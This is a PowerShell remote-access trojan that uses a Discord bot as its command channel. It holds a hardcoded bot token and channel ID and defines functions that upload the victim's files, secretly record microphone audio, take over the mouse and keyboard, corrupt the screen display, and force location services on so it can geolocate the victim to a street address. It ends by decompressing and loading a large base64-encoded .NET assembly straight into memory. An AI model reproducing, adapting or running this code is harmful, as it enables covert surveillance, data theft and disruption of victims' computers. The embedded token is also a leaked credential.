$token = "MTQ2ODAwMTc3NjA2NTMxNDg1OQ.GFB39R.VoL1F1lfy6YKuOuHvhNdq9G22c2BJMl1frjNBs"
$cid = "1468000933295427776"

Add-Type -A System.Net.Http, System.Windows.Forms, System.Drawing, System.Device, UIAutomationClient, UIAutomationTypes
add-type 'using System;using System.Runtime.InteropServices;public class win {[DllImport("user32.dll")]public static extern void mouse_event(uint dwFlags,uint dx,uint dy,uint dwData,UIntPtr dwExtraInfo);[DllImport("ntdll.dll")]public static extern int RtlAdjustPrivilege(uint Privilege, bool Enable, bool Client, ref bool CurrentState);[DllImport("ntdll.dll")]public static extern uint NtSetInformationProcess(IntPtr ProcessHandle, uint ProcessInformationClass, ref uint ProcessInformation, uint ProcessInformationLength);[DllImport("ntdll.dll")]public static extern int NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, ref uint Response);[DllImport("winmm.dll")]public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, IntPtr hwndCallback);}'

function upload {
	param($file)
	$client = [Net.Http.HttpClient]::new()
	$client.DefaultRequestHeaders.Authorization = [Net.Http.Headers.AuthenticationHeaderValue]::new("Bot", "$token");
	$content = [Net.Http.MultipartFormDataContent]::new()
	$fileContent = [Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes("$pwd\$file"))
	$content.Add($fileContent, "files[0]", $file)
	$client.PostAsync("https://discord.com/api/v10/channels/$cid/messages", $content)
}
function spy-mic {
	param([int]$t)
	$g=new-guid
	[win]::mciSendString("open new Type waveaudio Alias recsound", $null, 120, [IntPtr]::Zero)
	$r=[win]::mciSendString("record recsound", $null, 0, [IntPtr]::Zero)
	if ($r-ne0){
		return "mic access disabled"
	}
	sleep $t
	[win]::mciSendString("save recsound mic.wav", $null, 0, [IntPtr]::Zero)
	[win]::mciSendString("close recsound", $null, 0, [IntPtr]::Zero)
	upload "mic.wav"
	ri "mic.wav"
}

$global:screen = [Windows.Automation.AutomationElement]::RootElement.Current.BoundingRectangle
function auto-movecur {
	param([int]$x = (Get-Random -Max $screen.Width),[int]$y = (Get-Random -Max $screen.Height))
	[Windows.Forms.Cursor]::Position = [Drawing.Point]::new($x,$y)
}
function auto-getcur {
	return [Windows.Forms.Cursor]::Position | select X,Y
}
function auto-click {
	[win]::mouse_event(2, 0, 0, 0, [UIntPtr]::Zero)
	[win]::mouse_event(4, 0, 0, 0, [UIntPtr]::Zero)
}
function auto-rclick {
	[win]::mouse_event(8, 0, 0, 0, [UIntPtr]::Zero)
	[win]::mouse_event(16, 0, 0, 0, [UIntPtr]::Zero)
}
function auto-keybd {
	param($keys)
	[Windows.Forms.SendKeys]::SendWait($keys)
}
function auto-msg {
	param($m,$t,[int]$b=0,$i=0)
	[Windows.Forms.MessageBox]::Show($m,$t,$b,$i)
}


Add-Type 'using System;using System.Runtime.InteropServices;public class GDI {[DllImport("user32.dll")]public static extern IntPtr GetDC(IntPtr hWnd);[DllImport("user32.dll")]public static extern void ReleaseDC(IntPtr hWnd, IntPtr hDC);[DllImport("gdi32.dll")]public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);[DllImport("gdi32.dll")]public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);}'
$SRCCOPY = 0x00CC0020;
$NOTSRCCOPY = 0x00330008;
$SRCAND = 0x00880006;
function gdi-melt {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$x = Get-Random -Max ($w + 1)
			$null = [GDI]::BitBlt($hdc, $x, 1, 25, $h, $hdc, $x, 0, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-flash {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::BitBlt($hdc, 0, 0, $w, $h, $hdc, 0, 0, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($NOTSRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-tunnel {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$size = 100
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::StretchBlt($hdc, $size / 2, $size / 2, $w - $size, $h - $size, $hdc, 0, 0, $w, $h, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-stretch {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::StretchBlt($hdc, -20, 0, $w + 40, $h, $hdc, 0, 0, $w, $h, $c);
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-blackout {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::BitBlt($hdc, (Get-Random (1..10)) % 2, (Get-Random (1..10)) % 2, $w, $h, $hdc, (Get-Random (1..1000)) % 2, (Get-Random (1..1000)) % 2, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCAND)
	$null = $ps.BeginInvoke()
}
sasv lfsvc
function getelementbyid {
	param($a)
	$condition = [Windows.Automation.PropertyCondition]::new([Windows.Automation.AutomationElement]::AutomationIdProperty,$a)
	$global:element = $settings.FindFirst("Descendants",$condition)
}
function getelementbyname {
	param($a)
	$condition = [Windows.Automation.PropertyCondition]::new([Windows.Automation.AutomationElement]::NameProperty,$a)
	$global:element = $settings.FindFirst("Descendants",$condition)
}
function location-enable {
	saps "ms-settings:privacy-location"
	sleep -m 500
	$root = [Windows.Automation.AutomationElement]::RootElement
	$windows = $root.FindAll("Children",[Windows.Automation.Condition]::TrueCondition)
	$settings = $windows | ? {$_.Current.Name -eq "Settings"}
	$disabled_all=(gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location").value -eq 'Deny'
	$disabled_app=(gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location").value -eq 'Deny'
	$disabled_dsk=(gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location\NonPackaged").value -eq 'Deny'

	if ([environment]::osversion.version.build -ge 22000){
		if ($disabled_all) {
			getelementbyid "SystemSettings_CapabilityAccess_Location_SystemGlobal_ToggleSwitch"
			$r=$element.current.boundingrectangle
			$o=getcur
			movecur ([int]($r.x+$r.width/2)) ([int]($r.y+$r.height/2))
			click
			movecur $r.x $r.y
		}
	}
	else {
		if ($disabled_all) {
			getelementbyid "SystemSettings_CapabilityAccess_Location_SystemGlobal_Button"
			$toggle = $element.GetCurrentPattern([Windows.Automation.InvokePattern]::Pattern)
			$toggle.invoke()
			sleep -m 500
			$panel = $settings.FindAll("Descendants",[Windows.Automation.Condition]::TrueCondition) | ? {$_.current.name -match "Location access for this device"}
			$x = $panel.FindAll("Descendants",[Windows.Automation.Condition]::TrueCondition)
			$r=$d.current.boundingrectangle
			movecur ([int]($r.x+$r.width/2)+20) ([int]($r.y+$r.height/2))
			click
		}
	}
	if ($disabled_app) {
		getelementbyid "SystemSettings_CapabilityAccess_Location_UserGlobal_ToggleSwitch"
		$toggle = $element.GetCurrentPattern([Windows.Automation.TogglePattern]::Pattern)
		$toggle.toggle()
	}
	if ($disabled_dsk) {
		getelementbyid "SystemSettings_CapabilityAccess_Location_ClassicGlobal_ToggleSwitch"
		$toggle = $element.GetCurrentPattern([Windows.Automation.TogglePattern]::Pattern)
		$toggle.toggle()
	}
	keybd "%{F4}"
}
function location-get {
	param([switch]$address)
	$watcher = [Device.Location.GeoCoordinateWatcher]::new()
	$watcher.start()
	$loc=$watcher.position.location
	while ($loc.isunknown) {$loc=$watcher.position.location}
	$global:lat,$global:lon=$loc.latitude,$loc.longitude
	if ($address) {
		$global:addr=irm "https://nominatim.openstreetmap.org/reverse?lat=$lat&lon=$lon&format=json"
		return $addr
	}
	else {
		return $lat, $lon
	}
}

function load {
	param($asm)
	$ms = [IO.MemoryStream]::new()
	([IO.Compression.DeflateStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($asm)),[IO.Compression.CompressionMode]::Decompress)).CopyTo($ms)
	[Reflection.Assembly]::Load($ms.toarray())
}
load "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